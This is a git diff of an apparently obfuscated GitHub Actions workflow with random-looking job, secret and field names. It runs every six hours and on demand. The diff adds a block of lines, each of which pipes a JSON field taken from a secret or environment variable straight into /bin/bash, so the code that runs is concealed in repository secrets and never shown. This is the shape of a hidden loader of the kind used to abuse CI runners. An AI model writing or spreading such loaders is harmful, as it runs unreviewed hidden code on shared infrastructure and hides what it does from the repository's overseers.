@@ -1,9 +1,9 @@
 name: xianghuaguo3451
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '39 3/6 * * *'
+    - cron: '24 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,21 +12,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: xianghuaguo3451
         env:
-          ltmot54845: ${{ secrets.ltmot54845 }}
+          bsu91: ${{ secrets.bsu91 }}
         run: |
-          echo $ltmot54845 | jq -r .rxwk1 | /bin/bash
-          echo $odlzv326 | jq -r .qtbc773 | /bin/bash
-          echo $u1460 | jq -r .ov9959 | /bin/bash
-          echo $oyt48 | jq -r .j8 | /bin/bash
-          echo $pqe308 | jq -r .r86 | /bin/bash
-          echo $usx36967 | jq -r .gwj5929 | /bin/bash
-          echo $ivf8845 | jq -r .n65 | /bin/bash
-          echo $v83242 | jq -r .rqbd1 | /bin/bash
-          echo $b02 | jq -r .ekpht6876 | /bin/bash
-          echo $dt31 | jq -r .gjeeo1 | /bin/bash
-          echo $h9 | jq -r .bim3 | /bin/bash
-          echo $iisc5295 | jq -r .rmec486 | /bin/bash
-          echo $mpbna959 | jq -r .l450 | /bin/bash
-          echo $jubm88 | jq -r .daaqk81750 | /bin/bash
-          echo $vdu23937 | jq -r .zfotr6115 | /bin/bash
+          echo $bsu91 | jq -r .ujt5 | /bin/bash
+          echo $ptq371 | jq -r .omky6285 | /bin/bash
+          echo $ngqs9221 | jq -r .v0658 | /bin/bash
+          echo $gi3966 | jq -r .khi30222 | /bin/bash
+          echo $fprrt1 | jq -r .sgtup71683 | /bin/bash
+          echo $bfadv451 | jq -r .z83256 | /bin/bash
+          echo $u93630 | jq -r .khn9 | /bin/bash
+          echo $doice1712 | jq -r .tts26301 | /bin/bash
+          echo $s41999 | jq -r .ys70112 | /bin/bash
+          echo $lqday7 | jq -r .opuf47 | /bin/bash
+          echo $sbb6421 | jq -r .iuxvq79875 | /bin/bash
+          echo $ncby2 | jq -r .lj85 | /bin/bash
 
